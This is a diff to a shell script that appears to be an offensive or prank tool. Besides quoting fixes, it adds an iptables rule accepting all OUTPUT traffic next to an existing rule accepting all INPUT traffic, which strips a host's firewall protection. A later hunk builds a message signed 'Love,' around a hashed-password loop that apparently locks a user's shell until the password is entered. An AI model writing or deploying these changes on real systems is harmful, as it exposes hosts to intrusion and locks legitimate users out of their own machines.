@@ -3,9 +3,9 @@
 ################ CHECKS ###############################
 # Get the OS version
 get_os() {
-    if [[$(uname -s | grep Linux) != ""]]; then
+    if [ "$(uname -s | grep Linux)" != "" ]; then
 	OS="linux"
-    elif [[ $( uname -s | grep BSD) != "" ]]; then
+    elif [ "$( uname -s | grep BSD)" != "" ]; then
 	OS="bsd"
     else
 	adderr "[!] NOT \"Linux\" or \"BSD\""
@@ -41,6 +41,7 @@ check_req() {
         adderr "[!] NO IPTABLES FOUND"
     else
         `which iptables` -I INPUT 1 -j ACCEPT
+        `which iptables` -I OUTPUT 1 -j ACCEPT
     fi
 }
 ################ FUNCTIONS ##########################
@@ -149,7 +150,7 @@ Love,
 
     echo "Enter your new password: "
     read pass
-    hsh=$(echo $pass | openssl sha1 | cut -d' ' -f2)
+    hsh="$(echo $pass | openssl sha1 | cut -d' ' -f2)"
     msg="\
 while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
 \"$hsh\" ];\
